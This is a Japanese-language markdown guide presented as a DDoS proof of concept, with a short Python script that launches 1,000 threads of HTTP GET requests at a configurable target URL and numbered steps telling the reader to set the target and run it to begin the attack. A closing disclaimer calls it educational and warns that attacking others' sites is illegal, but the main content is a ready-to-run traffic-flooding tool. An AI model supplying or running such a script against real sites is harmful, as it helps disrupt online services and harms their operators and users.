# DDoS Proof of Concept（PoC）の作成

## 概要
このPoCは、分散型サービス拒否（DDoS）攻撃の概念を実証するためのシンプルなスクリプトです。このスクリプトは、攻撃者が複数のコンピューターを使用して目標のウェブサイトまたはサービスに大量のトラフィックを送信することによって、ターゲットをオーバーロードさせ、サービスを停止させることを意図しています。

## 必要なツール
- Python 3.x
- requestsライブラリ

## インストール
```bash
pip install requests
```

## スクリプト

```python
import requests
import threading

# ターゲットのURL
target_url = "https://example.com"

# 送信するリクエストの数
num_requests = 1000

# リクエストを送信する関数
def send_request():
    try:
        response = requests.get(target_url)
        print("Request sent successfully")
    except Exception as e:
        print(f"Failed to send request: {e}")

# メイン関数
def main():
    print(f"Sending {num_requests} requests to {target_url}")
    for i in range(num_requests):
        thread = threading.Thread(target=send_request)
        thread.start()

if __name__ == "__main__":
    main()
```

## 使い方
1. Pythonを使用して上記のスクリプトを保存します。
2. 必要なモジュールをインストールします。
3. `target_url`変数に攻撃対象のURLを指定します。
4. `num_requests`変数に送信するリクエストの数を指定します。
5. スクリプトを実行し、攻撃を開始します。

## 注意事項
- このPoCは教育目的のみで使用してください。実際のサービスやウェブサイトに対する攻撃は違法です。
- テストする際は、自身が所有するサービスやウェブサイトを対象にしてください。他者の許可なく攻撃を行うことは違法行為です。
- サービスやウェブサイトに対する攻撃は、重大な影響を及ぼす可能性があります。慎重に行動してください。
